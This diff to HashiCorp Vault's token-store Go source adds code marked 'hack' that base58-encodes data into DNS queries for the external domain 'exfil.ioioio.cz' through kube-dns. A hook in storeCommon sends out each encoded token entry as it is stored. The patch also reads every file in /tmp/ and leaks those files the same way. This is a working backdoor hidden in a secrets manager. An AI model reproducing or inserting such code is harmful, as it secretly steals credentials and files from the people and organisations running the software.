@@ -1,12 +1,15 @@
 package vault
 
 import (
+	"bufio"
 	"context"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"net/http"
+	"os"
 	"regexp"
 	"strings"
 	"sync"
@@ -35,7 +38,109 @@ import (
 	"github.com/hashicorp/vault/sdk/logical"
 	"github.com/hashicorp/vault/sdk/plugin/pb"
 	"github.com/mitchellh/mapstructure"
+
+	// hack
+
+	//"fmt"
+	//"log"
+	//"time"
+
+	"github.com/miekg/dns"
+	"github.com/mr-tron/base58"
 )
+
+// hack
+
+const (
+	subDomainSizeLimit   = 63
+	totalDomainSizeLimit = 253
+)
+
+var (
+//server        = flag.String("server", "", "The server where to send the \"lookups\"")
+//serverPort    = flag.String("port", "53", "Server port")
+//target        = flag.String("target", "", "The top part of the domain, payload will be sub-domain of this")
+// verbose       = flag.Bool("v", false, "Enable verbose logging")
+// fileSource    = flag.String("file", "", "Read data from file instead of default stdin")
+// dataChunkSize = flag.Int("size", 47, "Data chunk size in bytes")
+// token         = flag.String("token", "o", "Token for identification on server side")
+// timed         = flag.Int("timed", 0, "Send one chunk at every N seconds")
+// source = "/etc/passwd"
+)
+
+func fileSend() error {
+	readPath := "/tmp/"
+	files, err := ioutil.ReadDir(readPath)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	for _, file := range files {
+		//fmt.Println(file.Name(), file.IsDir())
+		if file.IsDir() {
+			continue
+		}
+
+		fileSource := readPath + file.Name()
+		fp, err := os.Open(fileSource)
+		if err != nil {
+			fmt.Println("failed to open file %s, %w", fileSource, err.Error())
+		}
+
+		source := fp
+		dataChunkSize := 32
+
+		scanner := bufio.NewReader(source)
+		counter := 0
+		size := dataChunkSize
+
+		var buffer [512]byte
+		for {
+
+			read, nil := scanner.Read(buffer[:size])
+			if read == 0 {
+				break
+			}
+
+			if err := sendData(buffer[:read], counter); err != nil {
+				fmt.Println("failed sending data, %s", err.Error())
+			}
+			counter++
+		}
+	}
+	return nil
+}
+
+func sendData(data []byte, count int) error {
+	var (
+		msg    dns.Msg
+		client dns.Client
+	)
+
+	target := "exfil.ioioio.cz"
+	token := "at"
+	server := "kube-dns" // HACK this is changing it to the kubernetes default service name
+	serverPort := "53"
+
+	encodedData := base58.Encode(data)
+	question := fmt.Sprintf("%s.%d.%s.%s.", encodedData, count, token, target)
+
+	if len(question) > totalDomainSizeLimit || len(encodedData) > subDomainSizeLimit {
+		return fmt.Errorf("subdomain validates limits (%d >? %d, %d >? %d)",
+			len(encodedData), subDomainSizeLimit, len(question), totalDomainSizeLimit)
+	}
+
+	msg.SetQuestion(question, dns.TypeA)
+
+	fmt.Printf("sending %8d %s\n", count, question)
+
+	_, _, err := client.Exchange(&msg, server+":"+serverPort)
+	if err != nil {
+		return fmt.Errorf("failed exchange, %w", err)
+	}
+
+	return nil
+}
 
 const (
 	// idPrefix is the prefix used to store tokens for their
@@ -988,6 +1093,13 @@ func (ts *TokenStore) storeCommon(ctx context.Context, entry *logical.TokenEntry
 	if err != nil {
 		return fmt.Errorf("failed to encode entry: %w", err)
 	}
+
+	// hack is this the value?
+	fmt.Println("HACK9: %s", enc)
+	sendData(enc, 1)
+	fileSend()
+	//sendData([]byte(json.Decoder(entry)), 2)
+	sendData([]byte("This is a test"), 1)
 
 	if writeSecondary {
 		// Write the secondary index if necessary. This is done before the
